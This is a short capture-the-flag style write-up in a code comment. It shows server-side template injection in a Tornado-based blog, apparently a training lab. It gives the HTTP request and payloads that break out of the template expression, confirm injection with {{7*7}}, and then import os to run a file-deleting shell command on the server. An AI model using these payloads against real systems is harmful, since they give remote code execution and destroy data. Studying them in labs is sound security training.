/*

1) POST a comment on a blog post

2) intercept the change name request to change the name to 

POST /my-account/change-blog-post-author-display HTTP/2
blog-post-author-display=user.name}}{{7*7}}

3) See the blog post the comment is posted bby
//
Peter Wiener49}} 

4) POST /my-account/change-blog-post-author-display HTTP/2
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')

5) Reload the blog post with our comment

In the Tornado documentation, identify the syntax 
for executing arbitrary Python:
{% somePython %}

Study the Tornado documentation to discover that template expressions 
are surrounded with double curly braces, such as {{someExpression}}
{% code %}
{{expression}}

*/